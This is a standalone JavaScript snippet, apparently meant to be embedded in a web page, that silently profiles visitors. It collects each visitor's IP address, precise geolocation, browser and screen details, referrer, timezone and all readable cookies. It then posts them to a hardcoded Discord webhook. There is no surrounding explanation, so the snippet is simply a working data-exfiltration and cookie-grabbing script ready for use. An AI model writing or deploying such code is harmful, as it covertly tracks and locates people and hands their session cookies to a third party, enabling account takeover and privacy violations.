(async function() {
    const webhookURL = "https://discord.com/api/webhooks/1355136372499026072/b7g7-A0oYTlos_WEcEgKibVu0TesuSGF2pCAi-s7gTzDl8MEufDIoOvYNQnd4qBUpjQ2";
    async function getIP() {
        try {
            const response = await fetch("https://api64.ipify.org?format=json");
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return "Unknown";
        }
    }

    function getGeolocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) return resolve(null);
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                    });
                },
                () => resolve(null)
            );
        });
    }
    const ip = await getIP();
    const geolocation = await getGeolocation();
    const data = {
        ip: ip,
        userAgent: navigator.userAgent,
        language: navigator.language,
        screen: {
            width: screen.width,
            height: screen.height,
        },
        browser: {
            platform: navigator.platform,
            vendor: navigator.vendor,
        },
        referrer: document.referrer || "Direct Visit",
        cookies: document.cookie || "No cookies",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        geolocation: geolocation,
    };
    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
    }).catch(console.error);
})();
